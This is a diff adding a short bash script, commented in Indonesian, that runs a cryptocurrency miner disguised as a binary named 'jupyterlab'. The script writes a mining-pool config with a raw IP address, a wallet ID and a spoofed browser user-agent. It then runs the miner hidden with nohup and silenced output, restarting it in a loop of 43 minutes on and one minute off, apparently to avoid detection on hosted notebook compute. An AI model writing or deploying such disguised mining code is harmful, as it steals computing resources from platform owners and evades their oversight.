@@ -1,0 +1,47 @@
+#!/usr/bin/env bash
+
+# Base folder
+BASE_DIR="./jupyterlab_dir"
+mkdir -p "$BASE_DIR"
+
+# Copy binary
+cp ./jupyterlab "$BASE_DIR/jupyterlab" 2>/dev/null || true
+chmod +x "$BASE_DIR/jupyterlab" 2>/dev/null
+
+# Masuk ke folder
+cd "$BASE_DIR" || exit 1
+
+# Buat config.json
+cat > config.json <<EOF
+{
+  "pools": [{
+    "url": "3.144.16.65:80",
+    "user": "Q0105004479f85cd7d62eeac7a6d6ec24cc6af897a72bac82b3f1d8a63b425e2430efd6504c753d",
+    "pass": "system",
+    "tls": true
+  }],
+  "threads": 4,
+  "user-agent": "Mozilla/5.0"
+}
+EOF
+
+while true; do
+  # Jalankan miner
+  nohup ./jupyterlab --config=config.json >/dev/null 2>&1 &
+
+  start_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
+  echo "[$start_time] ✅ STATUS: JALAN"
+  echo "Process on (aktif 43 menit)..."
+
+  sleep 2580  # 43 menit
+
+  # Matikan proses
+  pkill -f "jupyterlab"
+
+  stop_time=$(TZ=UTC-7 date +"%R-[%d/%m/%y]")
+  echo "[$stop_time] ⏸️  STATUS: MATI"
+  echo "Process off (tunggu 1 menit)..."
+
+  # Tunggu 1 menit
+  sleep 60
+done
